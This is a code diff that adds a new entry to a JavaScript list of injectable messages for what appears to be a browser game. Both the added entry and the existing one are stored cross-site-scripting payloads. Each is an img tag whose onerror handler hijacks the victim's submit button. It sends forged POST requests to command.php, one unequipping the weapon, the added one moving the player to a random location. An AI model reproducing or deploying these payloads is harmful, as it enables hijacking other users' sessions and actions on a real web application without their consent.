@@ -16,6 +16,16 @@ var wordslist = [
 			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(%26quot;" +
 			"mode=itemmain%26command=offwep" +
 			"%26quot;);};>"
+	},
+	{
+		id: "push",
+		name: "<神罗天征>",
+		content: "神罗天征" +
+			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
+			"o=zXmlHttp.createRequest();o.open(%26quot;post%26quot;,%26quot;command.php%26quot;,true);o.setRequestHeader(" +
+			"%26quot;Content-Type%26quot;,%26quot;application/x-www-form-urlencoded%26quot;);o.onreadystatechange=" +
+			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(" +
+			"%26quot;mode=command%26command=move%26moveto=%26quot;%2BparseInt(Math.random()*22));};>"
 	}
 ];
 
